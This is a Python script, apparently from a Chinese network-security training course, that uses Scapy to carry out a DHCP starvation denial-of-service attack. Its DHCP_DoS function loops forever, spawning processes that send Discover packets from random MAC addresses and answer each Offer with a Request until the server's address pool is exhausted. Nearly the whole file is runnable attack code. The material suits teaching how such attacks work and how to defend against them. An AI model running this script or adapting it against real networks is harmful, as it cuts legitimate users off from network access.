#!/usr/bin/env python3
# -*- coding=utf-8 -*-
# 本脚由亁颐堂现任明教教主编写，用于乾颐盾Python课程！
# 教主QQ:605658506
# 亁颐堂官网www.qytang.com
# 教主技术进化论拓展你的技术新边疆
# https://ke.qq.com/course/271956?tuin=24199d8a


import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # 清除报错
from scapy.all import *
import multiprocessing
import struct
from Part1_Classic_Protocols.Tools.Change_MAC_To_Bytes import Change_MAC_To_Bytes
from Part1_Classic_Protocols.Tools.GET_MAC import get_mac_address
from Part1_Classic_Protocols.Tools.Change_Chaddr_To_MAC import Change_Chaddr_To_MAC
from Part1_Classic_Protocols.Tools.Random_MAC import Random_MAC
from DHCP_Discover import DHCP_Discover_Sendonly
from DHCP_Request import DHCP_Request_Sendonly


def DHCP_Monitor_Control(pkt):
    try:
        # if pkt.getlayer(DHCP).fields['options'][0][1]== 1:#发现并且打印DHCP Discover
        # print('发现DHCP Discover包，MAC地址为:',end='')
        # MAC_Bytes = pkt.getlayer(BOOTP).fields['chaddr']
        # MAC_ADDR = Change_Chaddr_To_MAC(MAC_Bytes)
        # print(MAC_ADDR)
        # print('Request包中发现如下Options:')
        # for option in pkt.getlayer(DHCP).fields['options']:
        #		if option == 'end':
        #			break
        #		print('%-15s ==> %s' %(str(option[0]),str(option[1])))
        if pkt.getlayer(DHCP).fields['options'][0][1] == 2:  # 发现并且打印DHCP OFFER
            options = {}
            MAC_Bytes = pkt.getlayer(BOOTP).fields['chaddr']
            MAC_ADDR = Change_Chaddr_To_MAC(MAC_Bytes)
            options['MAC'] = MAC_ADDR
            options['client_id'] = Change_MAC_To_Bytes(MAC_ADDR)
            #	print('发现DHCP OFFER包，请求者得到的IP为:' + pkt.getlayer(BOOTP).fields['yiaddr'])
            #	print('OFFER包中发现如下Options:')
            #	for option in pkt.getlayer(DHCP).fields['options']:
            #		if option == 'end':
            #			break
            #		print('%-15s ==> %s' %(str(option[0]),str(option[1])))
            options['requested_addr'] = pkt.getlayer(BOOTP).fields['yiaddr']
            for i in pkt.getlayer(DHCP).fields['options']:
                if i[0] == 'server_id':
                    options['Server_IP'] = i[1]
            Send_Request = multiprocessing.Process(target=DHCP_Request_Sendonly, args=(Global_IF, options))
            Send_Request.start()
    # elif pkt.getlayer(DHCP).fields['options'][0][1]== 3:#发现并且打印DHCP Request
    #	print('发现DHCP Request包，请求的IP为:' + pkt.getlayer(BOOTP).fields['yiaddr'])
    #	print('Request包中发现如下Options:')
    #	for option in pkt.getlayer(DHCP).fields['options']:
    #		if option == 'end':
    #			break
    #		print('%-15s ==> %s' %(str(option[0]),str(option[1])))
    # elif pkt.getlayer(DHCP).fields['options'][0][1]== 5:#发现并且打印DHCP ACK
    #	print('发现DHCP ACK包，确认的IP为:' + pkt.getlayer(BOOTP).fields['yiaddr'])
    #	print('ACK包中发现如下Options:')
    #	for option in pkt.getlayer(DHCP).fields['options']:
    #		if option == 'end':
    #			break
    #		print('%-15s ==> %s' %(str(option[0]),str(option[1])))
    except Exception as e:
        print(e)
        pass


def DHCP_FULL_ONE(ifname, MAC, timeout=5):
    # 进行一次DHCP全过程
    Send_Discover = multiprocessing.Process(target=DHCP_Discover_Sendonly, args=(Global_IF, MAC))
    Send_Discover.start()
    # 发送DHCP Discover
    sniff(prn=DHCP_Monitor_Control, filter="port 68 and port 67", store=0, iface=Global_IF, timeout=timeout)


# 接收DHCP OFFER，并且回送DHCP Request

def DHCP_DoS(ifname):
    global Global_IF
    Global_IF = ifname
    while True:
        # 循环攻击开始
        DHCP_FULL_DOS = multiprocessing.Process(target=DHCP_FULL_ONE, args=(ifname, Random_MAC()))
        DHCP_FULL_DOS.start()


if __name__ == '__main__':
    ifname = 'ens33'
    DHCP_DoS(ifname)
